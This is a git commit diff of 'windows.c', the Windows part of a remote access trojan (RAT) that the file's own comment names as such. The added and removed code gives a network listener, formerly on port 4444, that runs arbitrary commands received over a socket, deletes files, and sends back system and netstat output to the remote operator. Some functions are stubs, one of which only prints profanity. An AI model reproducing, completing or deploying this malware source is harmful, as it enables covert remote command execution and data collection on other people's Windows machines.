6a7ee5d41684c566c8c5ae4ef19ca565a1df7cce
D3cl4n <38691337+D3cl4n@users.noreply.github.com>
2020-06-20 23:27:23 -0400

    Update windows.c

--- windows.c
+++ windows.c
@@ -1,24 +1,17 @@
+/* Dependencies */
+
 #include <stdio.h>
 #include <winsock2.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
 
-int recvTimeOutTCP(SOCKET socket, long sec, long usec)
-{
-   struct timeval timeout;
-   struct fd_set fds;
+/* Common Interface */
 
-   timeout.tv_sec = sec; //assign the second value
-   timeout.tv_usec = usec; //assign the micro second value
+#include "interface.h"
 
-   FD_ZERO(&fds);
-   FD_SET(socket, &fds);
-
-   return select(0, &fds, 0, 0, &timeout); //return -1 on error, 0 on timeout, > 0 if data ready
-}
-
-void runCommand(int sockFD, const char *argument)
+/* Platform specific functions for RAT features */
+void run_command(SOCKET sockFD, const char *argument)
 {
     FILE *fp;
     char path[1035];
@@ -41,7 +34,12 @@ void runCommand(int sockFD, const char *argument)
     sentData = send(sockFD, output, strlen(output), 0);
 }
 
-void deleteFile(int sockFD, const char *argument)
+void read_file(SOCKET sockFD, const char *filepath)
+{
+    printf("I FUCKING HATE CROSS PLATFORM SHIT\n");
+}
+
+void delete_file(SOCKET sockFD, const char *argument)
 {
     int sentData;
     char success[] = "File deleted successfully!\n";
@@ -52,13 +50,13 @@ void deleteFile(int sockFD, const char *argument)
         sentData = send(sockFD, success, strlen(success), 0);
     }
 
-    else 
+    else
     {
         sentData = send(sockFD, failure, strlen(failure), 0);
     }
 }
 
-void systemInfo(int sockFD)
+void system_info(SOCKET sockFD)
 {
     FILE *fp;
     char path[1035];
@@ -79,136 +77,95 @@ void systemInfo(int sockFD)
 	{
             strcat(output, path);
 	}
-        sentData = send(sockFD, output, strlen(output), 0);	
+        sentData = send(sockFD, output, strlen(output), 0);
     }
 }
 
-const char *parseFeature(char input[])
+void networking_info(SOCKET sockFD)
 {
-    char *token = strtok(input, "(");
-    return token;
-}
+    FILE *fp;
+    char path[1035];
+    char output[1024] = {0};
+    char fail[] = "Failed to execute";
+    int sentData;
 
-const char *parseArgument(char input[])
-{
-    char *token;
-    strtok(input, "(");
-    token = strtok(NULL, ")");
-    return token;
-}
+    fp = popen("netstat -a", "r");
 
-int main (int argc, char *argv[])
-{
-    WSADATA wsaData;
-    SOCKET ListeningSocket, NewConnection;
-    SOCKADDR_IN ServerAddr, SenderInfo;
-
-    int port = 4444;
-    int BytesReceived, i, nlen, SelectTiming;
-    char buffer[1024] = {0};
-    char buffer_1[1024] = {0};
-
-    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
+    if (fp == NULL)
     {
-        printf("Winsock initialization failed: %ld.\n", WSAGetLastError());
-	return 1;
-    }
-
-    else
-    {
-        printf("Ready to use, status: %s.\n", wsaData.szSystemStatus);
-    }
-
-    if (LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 2) //could not find usable winsock DLL
-    {
-        printf("Could not find usable winsock DLL 5u.%u\n.", LOBYTE(wsaData.wVersion), HIBYTE(wsaData.wVersion));
-	WSACleanup();
-	return 1;
-    }
-
-    else
-    {
-        printf("DLL supports the winsock version\n");
-    }
-
-    ListeningSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-
-    if (ListeningSocket == INVALID_SOCKET)
-    {
-        printf("Error making socket: %ld.\n", WSAGetLastError());
-	WSACleanup();
-	return 1;
+        strncpy(output, fail, strlen(fail));
+	sentData = send(sockFD, output, strlen(output), 0);
     }
 
     else 
     {
-        printf("Socket created successfully.\n");
+	while (fgets(path, sizeof(path), fp) != NULL)
+	{
+            strcat(output, path);
+        }
+
+	sentData = send(sockFD, output, strlen(output), 0);
     }
+}
+
+/* Socket IO functions with abstract return type */
+Hndl create_socket(const char *host, int port)
+{
+    WORD wVersionRequested;
+    WSADATA wsaData;
+    int wsaerr;
+
+    wVersionRequested = MAKEWORD(2, 2);
+    wsaerr = WSAStartup(wVersionRequested, &wsaData);
+
+    SOCKET m_socket;
+    m_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+
+    return m_socket;
+}
+
+int bind_socket(int port, SOCKET sockfd)
+{
+    SOCKADDR_IN ServerAddr;
 
     ServerAddr.sin_family = AF_INET;
     ServerAddr.sin_port = htons(port);
     ServerAddr.sin_addr.s_addr = htonl(INADDR_ANY);
 
-    if (bind(ListeningSocket, (SOCKADDR *)&ServerAddr, sizeof(ServerAddr)) == SOCKET_ERROR)
+    if (bind(sockfd, (SOCKADDR *)&ServerAddr, sizeof(ServerAddr)) == 0)
     {
-        printf("Bind error.\n");
-	closesocket(ListeningSocket);
-	WSACleanup();
-	return 1;
+        return 0;
     }
 
-    if (listen(ListeningSocket, 5) == SOCKET_ERROR)
+    else
     {
-        printf("Error listening: %ld.\n", WSAGetLastError());
-	closesocket(ListeningSocket);
-	WSACleanup();
-	return 1;
+        return 1;
+    }
+}
+
+int listen_socket(int maxConnections, SOCKET sockfd)
+{
+    if (listen(sockfd, maxConnections) == 0)
+    {
+        return 0;
     }
 
-    SelectTiming = recvTimeOutTCP(ListeningSocket, 100, 100);
-
-    switch (SelectTiming)
+    else
     {
-        case 0:
-		printf("Timeout\n");
-		break;
-
-	case -1:
-		printf("Error\n");
-		break;
-
-	default:
-		{
-                    while(1)
-		    {
-                        NewConnection = SOCKET_ERROR;
-			while (NewConnection == SOCKET_ERROR)
-			{
-                            NewConnection = accept(ListeningSocket, NULL, NULL);
-			    BytesReceived = recv(NewConnection, buffer, sizeof(buffer), 0);
-
-                            const char *feature = parseFeature(buffer);
-	                    const char *argument = parseArgument(buffer_1);			    
-
-			    if (strcmp(feature, "execute") == 0)
-			    {
-                                runCommand(NewConnection, argument);
-			    }
-
-			    else if (strcmp(feature, "delete") == 0)
-			    {
-                                deleteFile(NewConnection, argument);
-			    }
-
-			    else if (strcmp(feature, "sysinfo") == 0)
-			    {
-                                systemInfo(NewConnection);
-			    }
-			}
-		    }
-		}
+        return 1;
     }
+}
 
-    return 0;
+Hndl accept_socket(SOCKET sockfd, int port)
+{
+    SOCKET new_socket;
+    new_socket = accept(sockfd, NULL, NULL);
 
+    return new_socket;
+}
+
+int read_socket(SOCKET new_socket, char buffer[], int len)
+{
+    int valRead = recv(new_socket, buffer, len, 0);
+    return valRead;
 }
